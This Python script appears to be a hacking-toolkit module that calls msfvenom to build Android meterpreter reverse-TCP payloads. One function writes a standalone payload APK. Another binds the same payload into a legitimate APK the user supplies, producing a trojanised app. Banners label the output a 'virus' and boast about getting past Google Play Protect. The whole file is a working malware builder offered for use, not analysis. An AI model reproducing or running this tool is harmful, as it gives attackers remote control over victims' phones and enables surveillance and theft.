import sys
import time
import random
import os
from werno import *
def load():
    loading = werno.merah_putih+"######################"+werno.normal+"\n"
    for l in loading:
        sys.stdout.write(l)
        sys.stdout.flush()
        time.sleep(random.random()*10.0/100)

def type_buat():
    buat = "creating the server virus\n"
    for bu in buat:
        sys.stdout.write(bu)
        sys.stdout.flush()
        time.sleep(random.random()*10.0/100)

def bind_load():
    bl = "bind your virus is running\n"
    for bil in bl:
        sys.stdout.write(bil)
        sys.stdout.flush()
        time.sleep(random.random()*10.0/100)

def inj_load():
    inb = "inject your virus is running\n"
    for h_inb in inb:
        sys.stdout.write(h_inb)
        sys.stdout.flush()
        time.sleep(random.random()*10.0/100)

def type_sukses():
    suk = "success create virus server\n"
    for su in suk:
        sys.stdout.write(su)
        sys.stdout.flush()
        time.sleep(random.random()*10.0/100)

def b_sukses():
    bsuk = "success bind virus server\n"
    for bsu in bsuk:
        sys.stdout.write(bsu)
        sys.stdout.flush()
        time.sleep(random.random()*10.0/100)

def ban_andro():
    print('''
      |\___/|
     /       .
    |    /\__/|  Are u Crazy man?
    ||\  <.><.>  Android it's hard
    | _     > )  to bypass google play protect
     \   /----   but if you wanna play
     |   -\/     you also ready for die
     /     .
    ''')
    load()
    type_buat()
    set_ip = input("your ip local : ")
    set_port = input("your port : ")
    filennya = input("file name : ")
    folder = input("save to folder : ")
    
    if not os.path.exists(folder):
        os.system("mkdir {}".format(folder))
    else:
        load()
    
    h_andro = folder+'/'+filennya
    os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST={} LPORT={} > {} >/dev/null 2>&1".format(set_ip, set_port, h_andro))
    if not os.path.exists(h_andro):
        print("fail to create virus, check your config")
    else:
        type_sukses()
        print("Your location file : {}".format(os.getcwd()+"/"+h_andro))

def bind_apk():
    print(werno.njambon + '''
      _____
     "     "  Bind Aplication
    | () () | just relax and enjoy :)
     \  ^  /  if your virus in another path
      |||||   input your virus server using /
      |||||   (example : a/b.apk)
    ''' + werno.biasa)
    load()
    ip_l = input(werno.biasa+"your ip local : ")
    ip_p = input("your port : ")
    sl_file = input("input your file apk target (.apk) : ")
    out_file = input("filname output : ")
    sv_fldr = input("save to folder : ")

    if not os.path.exists(sv_fldr):
        os.system("mkdir {}".format(sv_fldr))
    elif not os.path.exists(sl_file):
        print("check your path file apk target!")
        return bind_apk()
    else:
        load()
    
    
    b_hasil = sv_fldr+'/'+out_file
    bind_load()
    os.system("msfvenom -x {} -p android/meterpreter/reverse_tcp LHOST={} LPORT={} -o {} >/dev/null 2>&1".format(sl_file, ip_l, ip_p, b_hasil))
    
    if not os.path.exists(b_hasil):
        print("Sorry your apk target not support with your jdk version")
        print("fail to bind server, check your config")
        return bind_apk()
    else:
        print("Your output: {}\n".format(os.getcwd()+"/"+b_hasil))
    load()